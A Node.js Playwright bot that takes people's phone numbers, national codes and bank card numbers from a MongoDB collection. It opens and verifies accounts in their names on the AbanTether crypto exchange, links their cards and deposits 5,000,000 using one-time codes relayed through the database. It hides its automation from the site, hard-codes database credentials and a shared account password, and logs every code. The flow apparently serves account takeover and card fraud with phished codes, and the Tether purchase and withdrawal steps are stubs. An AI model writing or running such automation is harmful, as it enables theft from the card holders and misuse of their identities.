const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
const fs = require('fs').promises;
const path = require('path');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI || 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority');
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.screenshotsDir = './screenshots';
        this.password = 'Aban@1404T';
        this.maxRetries = 3;
        this.otpTimeout = 180000; // 3 دقیقه برای دریافت OTP
    }

    async log(step, message) {
        const timestamp = new Date().toISOString();
        const logMessage = `[${timestamp}] [${step}] ${message}`;
        console.log(logMessage);
        await fs.appendFile('bot.log', logMessage + '\n');
    }

    async saveScreenshot(name) {
        try {
            await fs.mkdir(this.screenshotsDir, { recursive: true });
            const filepath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: filepath });
            this.log('SCREENSHOT', `Saved: ${filepath}`);
        } catch (error) {
            this.log('ERROR', `Screenshot error: ${error.message}`);
        }
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME || 'ZarrinApp');
            this.collection = this.db.collection(process.env.COLLECTION_NAME || 'zarinapp');
            this.log('DATABASE', '✅ Connected to MongoDB');
        } catch (error) {
            this.log('ERROR', `Database connection failed: ${error.message}`);
            throw error;
        }
    }

    async checkDatabase() {
        try {
            this.log('DATABASE', '🔍 Checking for pending users...');
            
            // جستجوی کاربرانی که OTP دارند یا نیاز به پردازش دارند
            const users = await this.collection.find({
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            }).toArray();

            this.log('DATABASE', `Found ${users.length} users to process`);

            for (const user of users) {
                const phone = user.personalPhoneNumber;
                
                if (phone && !this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `🚀 Starting processing for: ${phone}`);
                    this.processingUsers.add(phone);
                    
                    this.processUser(user).catch(async (error) => {
                        this.log('ERROR', `Failed for ${phone}: ${error.message}`);
                        this.processingUsers.delete(phone);
                        await this.updateUserStatus(phone, 'failed', error.message);
                    });
                }
            }
        } catch (error) {
            this.log('ERROR', `Database check error: ${error.message}`);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        let retryCount = user.retryCount || 0;
        
        try {
            this.log('PROCESS', `🔄 Processing user: ${phone} (Attempt ${retryCount + 1}/${this.maxRetries})`);
            await this.updateUserStatus(phone, 'starting', 'Process started');
            
            // Step 1: Initialize browser
            await this.updateUserStatus(phone, 'initializing_browser', 'Launching browser');
            await this.initializeBrowser();
            
            // Step 2: Enter phone number and wait for OTP
            await this.updateUserStatus(phone, 'entering_phone', 'Entering phone number');
            await this.enterPhoneNumber(user);
            
            // Step 3: Wait for OTP in database
            await this.updateUserStatus(phone, 'waiting_login_otp', 'Waiting for login OTP in database');
            const loginOTP = await this.waitForField(phone, 'otp_login');
            
            if (!loginOTP) {
                retryCount++;
                await this.updateUserStatus(phone, 'failed', 'No OTP received', retryCount);
                throw new Error('No OTP received from database');
            }
            
            // Step 4: Login with OTP
            await this.updateUserStatus(phone, 'logging_in', 'Logging in with OTP');
            await this.loginWithOTP(user, loginOTP);
            
            // Step 5: Skip password if not required
            await this.updateUserStatus(phone, 'checking_password', 'Checking if password needed');
            const passwordNeeded = await this.checkPasswordNeeded();
            
            if (passwordNeeded) {
                await this.updateUserStatus(phone, 'setting_password', 'Setting account password');
                await this.setPassword();
            } else {
                this.log('PASSWORD', '⚠️ Password step skipped or not required');
            }
            
            // Step 6: Complete basic KYC
            await this.updateUserStatus(phone, 'completing_basic_kyc', 'Completing basic KYC');
            await this.completeBasicKYC(user);
            
            // Step 7: Register bank card
            await this.updateUserStatus(phone, 'adding_card', 'Adding bank card');
            await this.addCard(user);
            
            await this.updateUserStatus(phone, 'waiting_card_otp', 'Waiting for card OTP');
            const cardOTP = await this.waitForField(phone, 'otp_register_card');
            
            if (!cardOTP) {
                retryCount++;
                await this.updateUserStatus(phone, 'failed', 'No card OTP received', retryCount);
                throw new Error('No card OTP received from database');
            }
            
            await this.updateUserStatus(phone, 'registering_card', 'Registering card with OTP');
            await this.registerCardWithOTP(cardOTP);
            
            // Step 8: Deposit money
            await this.updateUserStatus(phone, 'initiating_payment', 'Initiating payment');
            await this.initiatePayment();
            
            await this.updateUserStatus(phone, 'waiting_payment_otp', 'Waiting for payment OTP');
            const paymentOTP = await this.waitForField(phone, 'otp_payment');
            
            if (!paymentOTP) {
                retryCount++;
                await this.updateUserStatus(phone, 'failed', 'No payment OTP received', retryCount);
                throw new Error('No payment OTP received from database');
            }
            
            await this.updateUserStatus(phone, 'completing_payment', 'Completing payment');
            await this.completePayment(paymentOTP);
            
            // Step 9: Buy Tether
            await this.updateUserStatus(phone, 'buying_tether', 'Buying Tether');
            await this.buyTether();
            
            // Step 10: Withdraw Tether
            await this.updateUserStatus(phone, 'withdrawing', 'Withdrawing Tether');
            await this.withdrawTether();
            
            // Complete
            await this.updateUserStatus(phone, 'completed', 'Process completed successfully');
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `✅ Successfully completed for: ${phone}`);
            
        } catch (error) {
            this.log('ERROR', `❌ Process failed for ${phone}: ${error.message}`);
            retryCount++;
            
            if (retryCount >= this.maxRetries) {
                await this.updateUserStatus(phone, 'failed', `Failed after ${this.maxRetries} attempts: ${error.message}`, retryCount, true);
                this.log('RETRY', `⛔ Max retries reached for ${phone}`);
            } else {
                await this.updateUserStatus(phone, 'failed', `Attempt ${retryCount}/${this.maxRetries}: ${error.message}`, retryCount, false);
                this.log('RETRY', `🔄 Will retry ${phone} (${retryCount}/${this.maxRetries})`);
            }
            
            throw error;
        } finally {
            this.processingUsers.delete(phone);
            if (this.browser) {
                await this.closeBrowser();
            }
        }
    }

    async checkPasswordNeeded() {
        try {
            await this.sleep(2000);
            const pageContent = await this.page.content();
            
            // چک کردن آیا صفحه رمز عبور نشان داده می‌شود
            const hasPasswordField = pageContent.includes('رمز عبور') || 
                                   pageContent.includes('گذرواژه') ||
                                   await this.page.$('input[type="password"]');
            
            if (hasPasswordField) {
                this.log('PASSWORD', '✅ Password field found, will set password');
                return true;
            }
            
            // چک کردن آیا وارد پنل کاربری شده‌ایم
            const isLoggedIn = pageContent.includes('پنل کاربری') || 
                             pageContent.includes('کیف پول') ||
                             pageContent.includes('داشبورد');
            
            if (isLoggedIn) {
                this.log('PASSWORD', '✅ Already logged in, no password needed');
                return false;
            }
            
            // اگر نه پسورد پیدا شد نه لاگین، صبر بیشتر
            await this.sleep(3000);
            const updatedContent = await this.page.content();
            const hasPasswordAfterWait = updatedContent.includes('رمز عبور') || 
                                       updatedContent.includes('گذرواژه');
            
            return hasPasswordAfterWait;
            
        } catch (error) {
            this.log('ERROR', `Password check failed: ${error.message}`);
            return true; // احتیاطی رمز عبور را تنظیم کن
        }
    }

    async waitForField(phone, fieldName, timeout = 180000) {
        this.log('WAIT', `⏳ Waiting for ${fieldName} in database (${timeout/1000}s)...`);
        
        const startTime = Date.now();
        const checkInterval = 5000;
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const otp = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} received: ${otp}`);
                    
                    // Clear the OTP after reading
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return otp;
                }
                
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                const remaining = Math.floor((timeout - (Date.now() - startTime)) / 1000);
                
                if (elapsed % 30 === 0) {
                    this.log('WAIT', `⏳ [${elapsed}s elapsed, ${remaining}s remaining] Waiting for ${fieldName}...`);
                    
                    // Screenshot for debugging
                    await this.saveScreenshot(`waiting-${fieldName}`);
                }
                
                await this.sleep(checkInterval);
                
            } catch (error) {
                this.log('ERROR', `Error checking ${fieldName}: ${error.message}`);
                await this.sleep(checkInterval);
            }
        }
        
        this.log('WAIT', `⏰ Timeout waiting for ${fieldName}`);
        return null;
    }

    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 Initializing browser...');
            
            this.browser = await chromium.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1280,720',
                    '--disable-blink-features=AutomationControlled'
                ]
            });
            
            const context = await this.browser.newContext({
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: { width: 1280, height: 720 },
                locale: 'fa-IR',
                permissions: []
            });
            
            // Anti-detection
            await context.addInitScript(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            });
            
            this.page = await context.newPage();
            
            // Set longer timeouts
            this.page.setDefaultTimeout(120000);
            this.page.setDefaultNavigationTimeout(120000);
            
            this.log('BROWSER', '✅ Browser initialized');
            
        } catch (error) {
            this.log('ERROR', `Browser init failed: ${error.message}`);
            throw error;
        }
    }

    async enterPhoneNumber(user) {
        try {
            this.log('PHONE', `📱 Starting registration for: ${user.personalPhoneNumber}`);
            
            // Go directly to register page
            await this.page.goto('https://abantether.com/register', {
                waitUntil: 'networkidle',
                timeout: 60000
            });
            
            await this.sleep(3000);
            await this.saveScreenshot('01-register-page');
            
            // Enter phone number
            const phoneInputSelectors = [
                'input[type="tel"]',
                'input[type="text"][name*="phone"]',
                'input[type="text"][name*="mobile"]',
                'input[placeholder*="موبایل"]',
                'input[placeholder*="شماره همراه"]',
                'input[placeholder*="تلفن همراه"]'
            ];
            
            let phoneEntered = false;
            for (const selector of phoneInputSelectors) {
                try {
                    const input = await this.page.$(selector);
                    if (input && await input.isVisible()) {
                        await input.click();
                        await input.fill('');
                        await input.fill(user.personalPhoneNumber);
                        phoneEntered = true;
                        this.log('PHONE', `✅ Phone entered using selector: ${selector}`);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            if (!phoneEntered) {
                // Try all visible inputs
                const allInputs = await this.page.$$('input[type="text"], input[type="tel"]');
                for (const input of allInputs) {
                    try {
                        const placeholder = await input.getAttribute('placeholder') || '';
                        if (placeholder.includes('موبایل') || placeholder.includes('شماره')) {
                            await input.click();
                            await input.fill(user.personalPhoneNumber);
                            phoneEntered = true;
                            this.log('PHONE', `✅ Phone entered via placeholder: ${placeholder}`);
                            break;
                        }
                    } catch (error) {
                        continue;
                    }
                }
            }
            
            if (!phoneEntered) {
                throw new Error('Could not find phone input field');
            }
            
            await this.sleep(1000);
            await this.saveScreenshot('02-phone-filled');
            
            // Find and click submit button
            const submitButtons = [
                'button:has-text("ادامه")',
                'button:has-text("ثبت نام")',
                'button:has-text("مرحله بعد")',
                'button[type="submit"]',
                'form button'
            ];
            
            let buttonClicked = false;
            for (const buttonText of submitButtons) {
                try {
                    const button = await this.page.$(buttonText);
                    if (button && await button.isVisible()) {
                        await button.click();
                        buttonClicked = true;
                        this.log('PHONE', `✅ Clicked button: ${buttonText}`);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            if (!buttonClicked) {
                // Press Enter as fallback
                await this.page.keyboard.press('Enter');
                this.log('PHONE', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('03-after-phone-submit');
            
            this.log('PHONE', '✅ Phone submitted successfully');
            
        } catch (error) {
            this.log('ERROR', `Phone entry failed: ${error.message}`);
            await this.saveScreenshot('error-phone-entry');
            throw error;
        }
    }

    async loginWithOTP(user, otp) {
        try {
            this.log('LOGIN', `🔑 Entering OTP: ${otp}`);
            
            await this.sleep(2000);
            await this.saveScreenshot('04-before-otp-entry');
            
            // Find OTP input
            const otpSelectors = [
                'input[type="number"]',
                'input[inputmode="numeric"]',
                'input[pattern="[0-9]*"]',
                'input[maxlength="6"]',
                'input[maxlength="5"]',
                'input[placeholder*="کد"]',
                'input[placeholder*="رمز"]'
            ];
            
            let otpInput = null;
            for (const selector of otpSelectors) {
                otpInput = await this.page.$(selector);
                if (otpInput) break;
            }
            
            if (!otpInput) {
                // Try multiple OTP inputs
                const allInputs = await this.page.$$('input');
                for (const input of allInputs) {
                    const maxlength = await input.getAttribute('maxlength');
                    const type = await input.getAttribute('type');
                    if ((maxlength && (maxlength === '6' || maxlength === '5')) || type === 'number') {
                        otpInput = input;
                        break;
                    }
                }
            }
            
            if (!otpInput) {
                throw new Error('OTP input not found');
            }
            
            await otpInput.click();
            await otpInput.fill('');
            await otpInput.fill(otp);
            this.log('LOGIN', `✅ OTP entered: ${otp}`);
            
            await this.saveScreenshot('05-otp-entered');
            
            // Find confirm button
            const confirmButtons = [
                'button:has-text("تأیید")',
                'button:has-text("تایید")',
                'button:has-text("ورود")',
                'button[type="submit"]'
            ];
            
            let confirmClicked = false;
            for (const buttonText of confirmButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    confirmClicked = true;
                    this.log('LOGIN', `✅ Clicked: ${buttonText}`);
                    break;
                }
            }
            
            if (!confirmClicked) {
                await this.page.keyboard.press('Enter');
                this.log('LOGIN', '✅ Pressed Enter');
            }
            
            await this.sleep(8000);
            await this.saveScreenshot('06-after-login');
            
            this.log('LOGIN', '✅ Login completed');
            
        } catch (error) {
            this.log('ERROR', `Login failed: ${error.message}`);
            await this.saveScreenshot('error-login');
            throw error;
        }
    }

    async setPassword() {
        try {
            this.log('PASSWORD', '🔐 Setting password...');
            
            await this.sleep(3000);
            
            // Find password fields
            const passwordInputs = await this.page.$$('input[type="password"]');
            
            if (passwordInputs.length >= 1) {
                // Enter password in first field
                await passwordInputs[0].click();
                await passwordInputs[0].fill('');
                await passwordInputs[0].fill(this.password);
                this.log('PASSWORD', `✅ Password entered: ${this.password}`);
                
                // If there's a second field for confirmation
                if (passwordInputs.length >= 2) {
                    await passwordInputs[1].click();
                    await passwordInputs[1].fill('');
                    await passwordInputs[1].fill(this.password);
                    this.log('PASSWORD', '✅ Confirm password entered');
                }
                
                await this.saveScreenshot('07-password-filled');
                
                // Find submit button
                const submitButtons = [
                    'button:has-text("تکمیل ثبت‌نام")',
                    'button:has-text("ثبت")',
                    'button:has-text("ادامه")',
                    'button[type="submit"]'
                ];
                
                let submitted = false;
                for (const buttonText of submitButtons) {
                    const button = await this.page.$(buttonText);
                    if (button && await button.isVisible()) {
                        await button.click();
                        submitted = true;
                        this.log('PASSWORD', `✅ Clicked: ${buttonText}`);
                        break;
                    }
                }
                
                if (!submitted) {
                    await this.page.keyboard.press('Enter');
                    this.log('PASSWORD', '✅ Pressed Enter');
                }
                
                await this.sleep(5000);
                await this.saveScreenshot('08-after-password');
                
            } else {
                this.log('PASSWORD', '⚠️ No password fields found, might have skipped');
            }
            
        } catch (error) {
            this.log('ERROR', `Password setting failed: ${error.message}`);
            await this.saveScreenshot('error-password');
            throw error;
        }
    }

    async completeBasicKYC(user) {
        try {
            this.log('KYC', '📋 Completing basic KYC...');
            
            await this.sleep(3000);
            
            // Enter national code if field exists
            if (user.personalNationalCode) {
                const nationalCodeSelectors = [
                    'input[placeholder*="کد ملی"]',
                    'input[name*="national"]',
                    'input[name*="code"]'
                ];
                
                for (const selector of nationalCodeSelectors) {
                    const input = await this.page.$(selector);
                    if (input) {
                        await input.click();
                        await input.fill(user.personalNationalCode);
                        this.log('KYC', `✅ National code entered: ${user.personalNationalCode}`);
                        break;
                    }
                }
            }
            
            // Enter birth date if field exists
            if (user.personalBirthDate) {
                const birthDateSelectors = [
                    'input[placeholder*="تاریخ تولد"]',
                    'input[name*="birth"]',
                    'input[name*="date"]'
                ];
                
                for (const selector of birthDateSelectors) {
                    const input = await this.page.$(selector);
                    if (input) {
                        await input.click();
                        await input.fill(user.personalBirthDate);
                        this.log('KYC', `✅ Birth date entered: ${user.personalBirthDate}`);
                        break;
                    }
                }
            }
            
            await this.saveScreenshot('09-kyc-filled');
            
            // Find submit button
            const submitButtons = [
                'button:has-text("تأیید اطلاعات")',
                'button:has-text("ادامه")',
                'button[type="submit"]'
            ];
            
            let submitted = false;
            for (const buttonText of submitButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    submitted = true;
                    this.log('KYC', `✅ Clicked: ${buttonText}`);
                    break;
                }
            }
            
            if (!submitted) {
                await this.page.keyboard.press('Enter');
                this.log('KYC', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('10-after-kyc');
            
        } catch (error) {
            this.log('ERROR', `KYC failed: ${error.message}`);
            await this.saveScreenshot('error-kyc');
            throw error;
        }
    }

    async addCard(user) {
        try {
            this.log('CARD', '💳 Adding bank card...');
            
            // Navigate to wallet/card page
            await this.page.goto('https://abantether.com/wallet', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            await this.saveScreenshot('11-wallet-page');
            
            // Find add card button or link
            const addCardButtons = [
                'button:has-text("افزودن کارت جدید")',
                'a:has-text("افزودن کارت")',
                'button:has-text("ثبت کارت")',
                'div:has-text("کارت جدید")'
            ];
            
            let cardAdded = false;
            for (const buttonText of addCardButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    cardAdded = true;
                    this.log('CARD', `✅ Clicked: ${buttonText}`);
                    await this.sleep(2000);
                    break;
                }
            }
            
            if (!cardAdded) {
                this.log('CARD', '⚠️ Add card button not found, trying direct form');
            }
            
            await this.saveScreenshot('12-add-card-form');
            
            // Enter card number
            if (user.cardNumber) {
                const cardNumberSelectors = [
                    'input[placeholder*="شماره کارت"]',
                    'input[name*="card"]',
                    'input[type="text"][maxlength="16"]',
                    'input[type="tel"][maxlength="16"]'
                ];
                
                for (const selector of cardNumberSelectors) {
                    const input = await this.page.$(selector);
                    if (input) {
                        await input.click();
                        await input.fill(user.cardNumber);
                        this.log('CARD', `✅ Card number entered: ${user.cardNumber}`);
                        break;
                    }
                }
            }
            
            await this.saveScreenshot('13-card-filled');
            
            // Submit card
            const submitCardButtons = [
                'button:has-text("ثبت کارت")',
                'button:has-text("تایید")',
                'button[type="submit"]'
            ];
            
            for (const buttonText of submitCardButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    this.log('CARD', `✅ Clicked: ${buttonText}`);
                    break;
                }
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('14-card-submitted');
            
            this.log('CARD', '✅ Card registration initiated');
            
        } catch (error) {
            this.log('ERROR', `Add card failed: ${error.message}`);
            await this.saveScreenshot('error-add-card');
            throw error;
        }
    }

    async registerCardWithOTP(otp) {
        try {
            this.log('CARD_OTP', `🔐 Entering card OTP: ${otp}`);
            
            // Enter OTP
            await this.enterOTP(otp);
            await this.saveScreenshot('15-card-otp-entered');
            
            // Confirm
            const confirmButton = await this.page.$('button:has-text("تأیید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('CARD_OTP', '✅ Card confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('16-card-registered');
            
        } catch (error) {
            this.log('ERROR', `Card registration failed: ${error.message}`);
            await this.saveScreenshot('error-card-otp');
            throw error;
        }
    }

    async enterOTP(otp) {
        const otpSelectors = [
            'input[type="number"]',
            'input[inputmode="numeric"]',
            'input[maxlength="6"]',
            'input[maxlength="5"]'
        ];
        
        for (const selector of otpSelectors) {
            const input = await this.page.$(selector);
            if (input) {
                await input.click();
                await input.fill(otp);
                return;
            }
        }
        
        // Try all inputs
        const allInputs = await this.page.$$('input');
        for (const input of allInputs) {
            const type = await input.getAttribute('type');
            if (type === 'number' || type === 'tel') {
                await input.click();
                await input.fill(otp);
                return;
            }
        }
        
        throw new Error('OTP input not found');
    }

    async initiatePayment() {
        try {
            this.log('PAYMENT', '💰 Initiating payment...');
            
            await this.page.goto('https://abantether.com/wallet', { waitUntil: 'networkidle' });
            await this.sleep(2000);
            
            // Find deposit button
            const depositButtons = [
                'button:has-text("واریز تومان")',
                'a:has-text("واریز")',
                'div:has-text("واریز")'
            ];
            
            for (const buttonText of depositButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    this.log('PAYMENT', `✅ Clicked: ${buttonText}`);
                    await this.sleep(2000);
                    break;
                }
            }
            
            await this.saveScreenshot('17-deposit-page');
            
            // Select online payment
            const onlinePaymentButtons = [
                'button:has-text("واریز آنلاین")',
                'div:has-text("درگاه پرداخت")',
                'button:has-text("درگاه")'
            ];
            
            for (const buttonText of onlinePaymentButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    this.log('PAYMENT', `✅ Clicked: ${buttonText}`);
                    await this.sleep(2000);
                    break;
                }
            }
            
            await this.saveScreenshot('18-payment-method');
            
            // Enter amount
            const amountInput = await this.page.$('input[placeholder*="مبلغ"], input[name*="amount"]');
            if (amountInput) {
                await amountInput.click();
                await amountInput.fill('5000000');
                this.log('PAYMENT', '✅ Amount entered: 5,000,000');
            }
            
            await this.saveScreenshot('19-amount-filled');
            
            // Submit payment
            const payButtons = [
                'button:has-text("پرداخت")',
                'button:has-text("ایجاد درخواست")',
                'button[type="submit"]'
            ];
            
            for (const buttonText of payButtons) {
                const button = await this.page.$(buttonText);
                if (button && await button.isVisible()) {
                    await button.click();
                    this.log('PAYMENT', `✅ Clicked: ${buttonText}`);
                    break;
                }
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('20-payment-initiated');
            
        } catch (error) {
            this.log('ERROR', `Payment initiation failed: ${error.message}`);
            await this.saveScreenshot('error-payment-init');
            throw error;
        }
    }

    async completePayment(otp) {
        try {
            this.log('PAYMENT_OTP', `💳 Completing payment with OTP: ${otp}`);
            
            await this.saveScreenshot('21-bank-page');
            
            // Enter OTP for payment
            await this.enterOTP(otp);
            
            // Submit
            const confirmButton = await this.page.$('button:has-text("تأیید"), button:has-text("پرداخت")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('PAYMENT_OTP', '✅ Payment confirmed');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('22-payment-completed');
            
        } catch (error) {
            this.log('ERROR', `Payment completion failed: ${error.message}`);
            await this.saveScreenshot('error-payment-complete');
            throw error;
        }
    }

    async buyTether() {
        try {
            this.log('BUY', '🛒 Buying Tether...');
            
            await this.page.goto('https://abantether.com/market', { waitUntil: 'networkidle' });
            await this.sleep(2000);
            await this.saveScreenshot('23-market-page');
            
            // Simple implementation - in real scenario would interact with buy form
            this.log('BUY', '✅ Simulated Tether purchase');
            
            await this.sleep(2000);
            await this.saveScreenshot('24-buy-completed');
            
        } catch (error) {
            this.log('ERROR', `Buy Tether failed: ${error.message}`);
            await this.saveScreenshot('error-buy');
            throw error;
        }
    }

    async withdrawTether() {
        try {
            this.log('WITHDRAW', '🏦 Withdrawing Tether...');
            
            await this.page.goto('https://abantether.com/wallet', { waitUntil: 'networkidle' });
            await this.sleep(2000);
            await this.saveScreenshot('25-wallet-for-withdraw');
            
            // Simple implementation
            this.log('WITHDRAW', '✅ Simulated Tether withdrawal');
            
            await this.sleep(2000);
            await this.saveScreenshot('26-withdraw-completed');
            
        } catch (error) {
            this.log('ERROR', `Withdraw failed: ${error.message}`);
            await this.saveScreenshot('error-withdraw');
            throw error;
        }
    }

    async updateUserStatus(phone, status, message, retryCount = 0, processed = false) {
        try {
            const updateData = {
                status: status,
                statusMessage: message,
                lastUpdated: new Date(),
                retryCount: retryCount
            };
            
            if (processed) {
                updateData.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { $set: updateData }
            );
            
            this.log('STATUS', `📊 ${phone}: ${status} (Attempt ${retryCount}) - ${message}`);
            
        } catch (error) {
            this.log('ERROR', `Status update failed: ${error.message}`);
        }
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date(),
                        statusMessage: "Process completed successfully"
                    }
                }
            );
            
            this.log('COMPLETE', `✅ Marked ${phone} as completed`);
            
        } catch (error) {
            this.log('ERROR', `Mark as completed failed: ${error.message}`);
        }
    }

    async closeBrowser() {
        try {
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
                this.log('BROWSER', '✅ Browser closed');
            }
        } catch (error) {
            this.log('ERROR', `Browser close failed: ${error.message}`);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        this.log('POLLING', '🔄 Starting database polling (every 30 seconds)');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `Polling error: ${error.message}`);
            }
        }, 30000);
        
        // Health check
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'running',
                timestamp: new Date().toISOString(),
                processing: Array.from(this.processingUsers)
            }));
        });
        
        server.listen(8080, () => {
            this.log('SERVER', '🌐 Health check on port 8080');
        });
    }

    async start() {
        this.log('START', '🤖 AbanTether Bot Starting...');
        this.log('CONFIG', `Max retries: ${this.maxRetries}`);
        this.log('CONFIG', `OTP timeout: ${this.otpTimeout/1000}s`);
        
        try {
            await this.connectToMongoDB();
            await this.startPolling();
        } catch (error) {
            this.log('ERROR', `Start failed: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start();

// هندل خطاها
process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED_REJECTION]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT_EXCEPTION]', error);
});